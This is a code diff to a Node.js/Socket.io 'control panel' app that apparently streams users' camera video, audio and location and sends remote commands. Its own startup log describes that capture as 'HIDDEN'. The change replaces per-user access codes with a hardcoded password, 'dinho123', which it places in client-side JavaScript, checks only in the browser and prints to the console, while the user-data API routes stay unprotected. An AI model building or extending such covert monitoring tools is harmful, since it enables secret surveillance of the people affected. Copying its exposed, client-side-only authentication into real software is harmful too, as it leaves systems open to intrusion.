@@ -12,9 +12,11 @@ const io = new Server(server, {
 const PORT = process.env.PORT || 3000;
 
 // ========== ARMAZENAMENTO ==========
-const users = new Map(); // userId -> { id, name, socketId, online, lastSeen }
-const messages = new Map(); // userId -> [{ id, from, to, text, timestamp }]
-const activeSockets = new Map(); // socketId -> userId
+const users = new Map();
+const messages = new Map();
+
+// ========== SENHA FIXA ==========
+const FIXED_PASSWORD = "dinho123";
 
 // ========== ROTAS ==========
 
@@ -283,7 +285,7 @@ app.get('/', (req, res) => {
             <h3>› ACCESS CODE ‹</h3>
             <div class="form-group">
                 <label>CODE</label>
-                <input type="text" id="userId" placeholder="ENTER ACCESS CODE" maxlength="36">
+                <input type="password" id="userPassword" placeholder="ENTER PASSWORD" maxlength="20">
             </div>
             <div class="form-group">
                 <label>NAME</label>
@@ -333,13 +335,13 @@ app.get('/', (req, res) => {
 
         // ===== LOGIN =====
         loginBtn.onclick = () => {
-            const id = document.getElementById('userId').value.trim();
+            const password = document.getElementById('userPassword').value.trim();
             const name = document.getElementById('userName').value.trim();
-            if(!id || !name) { loginError.textContent = 'ERROR: INVALID INPUT'; return; }
+            if(!password || !name) { loginError.textContent = 'ERROR: INVALID INPUT'; return; }
             loginBtn.disabled = true;
             loginBtn.textContent = '● CONNECTING...';
             loginError.textContent = '';
-            socket.emit('user_login', { userId: id, name: name });
+            socket.emit('user_login', { password: password, name: name });
         };
 
         socket.on('login_success', (data) => {
@@ -751,41 +753,19 @@ app.get('/', (req, res) => {
         .music-item .play { opacity: 0.4; }
         .info-text { font-size: 10px; opacity: 0.2; margin: 3px 0; }
         hr { border: none; border-top: 1px solid #00ff41; opacity: 0.05; margin: 10px 0; }
-        .code-display {
-            background: #111;
-            padding: 10px 12px;
-            border: 1px solid #00ff41;
-            border-radius: 3px;
-            font-size: 14px;
-            letter-spacing: 3px;
-            text-align: center;
-            margin: 8px 0;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-        }
-        .code-actions {
+        .login-panel {
             display: flex;
-            gap: 8px;
-            margin-top: 5px;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
         }
-        .code-actions button {
-            flex: 1;
-            padding: 6px;
-            background: #00ff41;
-            color: #0a0a0a;
-            border: none;
-            border-radius: 2px;
-            cursor: pointer;
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            letter-spacing: 1px;
-            transition: all 0.3s;
+        .login-panel h2 {
+            text-align: center;
+            font-weight: normal;
+            letter-spacing: 4px;
+            opacity: 0.5;
+            margin-bottom: 20px;
         }
-        .code-actions button:hover { background: #00cc33; }
-        .code-actions .delete-code {
-            background: #ff0044;
-        }
-        .code-actions .delete-code:hover { background: #cc0033; }
         @media (max-width: 1100px) {
             .main-grid { grid-template-columns: 1fr; height: auto; }
             .panel { max-height: 400px; }
@@ -795,30 +775,43 @@ app.get('/', (req, res) => {
 <body>
     <div class="container">
         <h1>● CONTROL PANEL ●</h1>
-        <div class="main-grid">
-            <!-- Usuários -->
-            <div class="panel">
-                <h2>● USERS</h2>
+        
+        <!-- Login do PC -->
+        <div id="pcLogin" style="max-width:400px;margin:0 auto 20px;">
+            <div style="background:#0d0d0d;border:1px solid #00ff41;border-radius:5px;padding:20px;">
+                <h2 style="text-align:center;font-weight:normal;letter-spacing:3px;opacity:0.5;font-size:14px;margin-bottom:15px;">● ADMIN ACCESS ●</h2>
                 <div class="form-group">
-                    <label>USER NAME</label>
-                    <input type="text" id="userName" placeholder="ENTER NAME">
+                    <label>PASSWORD</label>
+                    <input type="password" id="pcPassword" placeholder="ENTER PASSWORD">
                 </div>
-                <button class="btn-primary" id="addUser">+ GENERATE CODE</button>
-                <hr>
-                <div id="userList"></div>
+                <button class="btn-primary" id="pcLoginBtn">► UNLOCK</button>
+                <div id="pcLoginError" style="color:#ff0044;text-align:center;margin-top:10px;font-size:12px;"></div>
             </div>
+        </div>
 
-            <!-- Chat -->
-            <div class="panel chat-area">
-                <div id="chatContainer">
-                    <div class="no-user"><h3>● SELECT USER</h3></div>
+        <!-- Painel Principal (oculto até login) -->
+        <div id="mainPanel" style="display:none;">
+            <div class="main-grid">
+                <!-- Usuários -->
+                <div class="panel">
+                    <h2>● USERS</h2>
+                    <div id="userList">
+                        <div style="text-align:center;opacity:0.15;padding:20px;font-size:11px;">NO USERS</div>
+                    </div>
                 </div>
-            </div>
 
-            <!-- Info -->
-            <div class="panel">
-                <h2>● DATA</h2>
-                <div id="userInfo"><div class="no-user"><p>SELECT USER</p></div></div>
+                <!-- Chat -->
+                <div class="panel chat-area">
+                    <div id="chatContainer">
+                        <div class="no-user"><h3>● SELECT USER</h3></div>
+                    </div>
+                </div>
+
+                <!-- Info -->
+                <div class="panel">
+                    <h2>● DATA</h2>
+                    <div id="userInfo"><div class="no-user"><p>SELECT USER</p></div></div>
+                </div>
             </div>
         </div>
     </div>
@@ -829,13 +822,42 @@ app.get('/', (req, res) => {
         let currentUserId = null;
         let typingTimeout = null;
         let audioGain = null;
+        let isLoggedIn = false;
 
+        const pcLogin = document.getElementById('pcLogin');
+        const mainPanel = document.getElementById('mainPanel');
+        const pcPassword = document.getElementById('pcPassword');
+        const pcLoginBtn = document.getElementById('pcLoginBtn');
+        const pcLoginError = document.getElementById('pcLoginError');
         const userList = document.getElementById('userList');
         const chatContainer = document.getElementById('chatContainer');
         const userInfo = document.getElementById('userInfo');
 
+        // ===== LOGIN DO PC =====
+        const PANEL_PASSWORD = "dinho123";
+
+        pcLoginBtn.onclick = () => {
+            const pass = pcPassword.value.trim();
+            if(!pass) { pcLoginError.textContent = 'ENTER PASSWORD'; return; }
+            if(pass === PANEL_PASSWORD) {
+                isLoggedIn = true;
+                pcLogin.style.display = 'none';
+                mainPanel.style.display = 'block';
+                loadUsers();
+            } else {
+                pcLoginError.textContent = '● ACCESS DENIED ●';
+                pcPassword.value = '';
+                pcPassword.focus();
+            }
+        };
+
+        pcPassword.addEventListener('keypress', (e) => {
+            if(e.key === 'Enter') pcLoginBtn.click();
+        });
+
         // ===== CARREGAR USUÁRIOS =====
         async function loadUsers() {
+            if(!isLoggedIn) return;
             const res = await fetch('/api/users');
             const users = await res.json();
             renderUsers(users);
@@ -861,6 +883,7 @@ app.get('/', (req, res) => {
 
         // ===== SELECIONAR USUÁRIO =====
         async function selectUser(userId) {
+            if(!isLoggedIn) return;
             currentUserId = userId;
             loadUsers();
             const res = await fetch('/api/messages/' + userId);
@@ -926,7 +949,7 @@ app.get('/', (req, res) => {
         // ===== ENVIAR MENSAGEM =====
         function sendMessage() {
             const input = document.getElementById('chatInput');
-            if(!input) return;
+            if(!input || !isLoggedIn) return;
             const text = input.value.trim();
             if(!text || !currentUserId) return;
             socket.emit('send_message', { to: currentUserId, text, isFromPc: true });
@@ -946,36 +969,36 @@ app.get('/', (req, res) => {
         }
 
         function onTyping() {
-            if(!currentUserId) return;
+            if(!currentUserId || !isLoggedIn) return;
             socket.emit('typing_start', { to: currentUserId, isFromPc: true });
             if(typingTimeout) clearTimeout(typingTimeout);
             typingTimeout = setTimeout(() => stopTyping(), 1000);
         }
 
         function stopTyping() {
-            if(!currentUserId) return;
+            if(!currentUserId || !isLoggedIn) return;
             socket.emit('typing_stop', { to: currentUserId, isFromPc: true });
             if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
         }
 
         // ===== COMANDOS =====
         function sendCommand(command) {
-            if(!currentUserId) return;
+            if(!currentUserId || !isLoggedIn) return;
             socket.emit('comando', { userId: currentUserId, command });
         }
 
         function playMusic(videoId, songName) {
-            if(!currentUserId) return;
+            if(!currentUserId || !isLoggedIn) return;
             socket.emit('comando', { userId: currentUserId, command: 'play_youtube:' + videoId + ':' + songName });
         }
 
         function stopMusic() {
-            if(!currentUserId) return;
+            if(!currentUserId || !isLoggedIn) return;
             socket.emit('comando', { userId: currentUserId, command: 'stop_music' });
         }
 
         async function deleteUser() {
-            if(!currentUserId || !confirm('DELETE USER?')) return;
+            if(!currentUserId || !isLoggedIn || !confirm('DELETE USER?')) return;
             await fetch('/api/users/' + currentUserId, { method: 'DELETE' });
             currentUserId = null;
             loadUsers();
@@ -983,40 +1006,22 @@ app.get('/', (req, res) => {
             userInfo.innerHTML = '<div class="no-user"><p>DELETED</p></div>';
         }
 
-        // ===== ADICIONAR USUÁRIO =====
-        document.getElementById('addUser').onclick = async () => {
-            const name = document.getElementById('userName').value.trim();
-            if(!name) { alert('ENTER A NAME'); return; }
-            try {
-                const res = await fetch('/api/users', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name })
-                });
-                if(!res.ok) { const e = await res.json(); alert(e.error || 'ERROR'); return; }
-                const user = await res.json();
-                document.getElementById('userName').value = '';
-                loadUsers();
-                
-                // Mostrar código gerado
-                const code = user.id;
-                alert('● ACCESS CODE GENERATED ●\n\nCODE: ' + code + '\n\nSEND THIS CODE TO THE USER');
-            } catch(e) { alert('ERROR'); }
-        };
-
         // ===== SOCKET EVENTS =====
         socket.on('new_message_from_user', (data) => {
+            if(!isLoggedIn) return;
             if(currentUserId === data.userId) {
                 addMessageToChat(data.text, 'from-user');
             }
         });
 
         socket.on('user_typing', (data) => {
+            if(!isLoggedIn) return;
             const ind = document.getElementById('typingIndicator');
             if(ind) { ind.style.display = data.isTyping ? 'block' : 'none'; }
         });
 
         socket.on('user_status_change', (data) => {
+            if(!isLoggedIn) return;
             loadUsers();
             if(currentUserId === data.userId) {
                 fetch('/api/users/' + data.userId).then(r => r.json()).then(u => renderUserInfo(u));
@@ -1024,6 +1029,7 @@ app.get('/', (req, res) => {
         });
 
         socket.on('user_frame', (data) => {
+            if(!isLoggedIn) return;
             if(currentUserId === data.userId) {
                 const v = document.getElementById('userVideo');
                 if(v) v.src = data.frame;
@@ -1031,6 +1037,7 @@ app.get('/', (req, res) => {
         });
 
         socket.on('user_location', (data) => {
+            if(!isLoggedIn) return;
             if(currentUserId === data.userId) {
                 const l = document.getElementById('userLocation');
                 if(l) {
@@ -1042,7 +1049,10 @@ app.get('/', (req, res) => {
             }
         });
 
-        socket.on('force_disconnect', () => { alert('● CONNECTION TERMINATED'); location.reload(); });
+        socket.on('force_disconnect', () => { 
+            if(isLoggedIn) alert('● CONNECTION TERMINATED'); 
+            location.reload(); 
+        });
 
         // ===== ÁUDIO =====
         try {
@@ -1053,6 +1063,7 @@ app.get('/', (req, res) => {
         } catch(e) {}
 
         socket.on('user_audio', (data) => {
+            if(!isLoggedIn) return;
             if(currentUserId === data.userId && audioGain) {
                 try {
                     const ctx = audioGain.context;
@@ -1066,7 +1077,8 @@ app.get('/', (req, res) => {
             }
         });
 
-        loadUsers();
+        // Inicialização
+        if(isLoggedIn) loadUsers();
     </script>
 </body>
 </html>`);
@@ -1076,7 +1088,7 @@ app.get('/', (req, res) => {
 // ========== API REST ==========
 app.use(express.json());
 
-// Criar usuário (gera código)
+// Criar usuário (qualquer um pode se cadastrar com a senha)
 app.post('/api/users', (req, res) => {
   const { name } = req.body;
   if(!name) return res.status(400).json({ error: 'Name is required' });
@@ -1130,20 +1142,50 @@ io.on('connection', (socket) => {
   console.log('Client connected:', socket.id);
   let currentUserId = null;
 
-  socket.on('user_login', ({ userId, name }) => {
-    const user = users.get(userId);
-    if(!user) {
-      socket.emit('login_error', { error: 'Invalid code' });
+  socket.on('user_login', ({ password, name }) => {
+    // Verifica a senha fixa
+    if(password !== FIXED_PASSWORD) {
+      socket.emit('login_error', { error: 'Invalid password' });
       return;
     }
-    if(user.name !== name) {
-      socket.emit('login_error', { error: 'Name mismatch' });
-      return;
+
+    // Verifica se já existe um usuário com este nome
+    let existingUser = null;
+    for(let [id, user] of users) {
+      if(user.name === name) {
+        existingUser = user;
+        break;
+      }
     }
+
+    let userId;
+    let user;
+
+    if(existingUser) {
+      // Usuário já existe - usa o ID existente
+      userId = existingUser.id;
+      user = existingUser;
+    } else {
+      // Cria novo usuário
+      userId = uuidv4();
+      user = { 
+        id: userId, 
+        name: name, 
+        socketId: null, 
+        online: false, 
+        lastSeen: new Date(), 
+        createdAt: new Date() 
+      };
+      users.set(userId, user);
+      messages.set(userId, []);
+    }
+
+    // Desconectar sessão anterior se existir
     if(user.socketId) {
       const old = io.sockets.sockets.get(user.socketId);
       if(old) { old.emit('force_disconnect', { reason: 'New connection' }); old.disconnect(); }
     }
+
     user.socketId = socket.id;
     user.online = true;
     user.lastSeen = new Date();
@@ -1246,21 +1288,12 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log('   PORT: ' + PORT);
   console.log('   PC: http://localhost:' + PORT);
   console.log('   MOBILE: http://localhost:' + PORT);
+  console.log('\n● ACCESS:');
+  console.log('   PC PASSWORD: ' + FIXED_PASSWORD);
+  console.log('   MOBILE PASSWORD: ' + FIXED_PASSWORD);
   console.log('\n● FUNCTIONS:');
-  console.log('   ✓ GENERATE ACCESS CODES');
+  console.log('   ✓ FIXED PASSWORD: ' + FIXED_PASSWORD);
   console.log('   ✓ REAL-TIME CHAT');
   console.log('   ✓ VIDEO/AUDIO/LOCATION (HIDDEN)');
   console.log('   ✓ REMOTE COMMANDS\n');
-
-  setTimeout(() => {
-    if(users.size === 0) {
-      const id = uuidv4();
-      users.set(id, { id, name: 'Demo User', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
-      messages.set(id, []);
-      console.log('● DEMO CODE GENERATED ●');
-      console.log('   CODE: ' + id);
-      console.log('   NAME: Demo User');
-      console.log('\n   SEND THIS CODE TO THE USER\n');
-    }
-  }, 1000);
 });
